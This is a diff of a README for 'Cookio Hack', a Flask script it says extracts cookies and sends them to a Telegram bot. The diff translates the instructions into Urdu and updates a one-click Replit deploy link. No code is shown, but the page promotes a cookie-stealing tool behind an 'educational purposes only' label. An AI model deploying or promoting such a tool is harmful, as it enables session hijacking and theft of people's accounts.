@@ -1,15 +1,20 @@
 # 🍪 Cookio Hack - Flask Cookie Extractor 🚀  
 
-This is a Flask-based script that extracts cookies and sends them to a Telegram bot. **For educational purposes only!**  
+یہ ایک **Flask-based** اسکرپٹ ہے جو کوکیز کو **Extract** کر کے **Telegram Bot** پر بھیجتا ہے۔   
+📢 **صرف تعلیمی مقاصد کے لیے!**  
 
-## 🔥 Deploy on Replit (One-Click)  
-Click the button below to **automatically fork & run** the project on Replit.  
+---
 
-[![Run on Replit](https://replit.com/badge/github/tahiriqbal756/cookio-hack-)](https://replit.com/new/github.com/tahiriqbal756/cookio-hack-)  
+## 🔥 Replit پر One-Click Deploy  
+نیچے دیے گئے بٹن پر کلک کریں تاکہ **یہ پروجیکٹ خودکار طور پر Replit پر فورک ہو جائے۔**  
 
-## 📌 How to Run on Replit  
-1. **Click the "Run on Replit" button above**.  
-2. Replit will **automatically create a new project**.  
-3. Open the **Shell** and install dependencies:  
+[![Run on Replit](https://replit.com/badge/github/tahiriqbal756/cookio-hack-)](https://replit.com/github/tahiriqbal756/cookio-hack-)
+
+---
+
+## 📌 Replit پر چلانے کا طریقہ  
+1. **"Run on Replit"** بٹن دبائیں۔  
+2. Replit **خودکار طور پر ایک نیا پروجیکٹ بنائے گا۔**  
+3. **Shell** کھولیں اور dependencies انسٹال کریں:  
    ```bash
    pip install flask requests
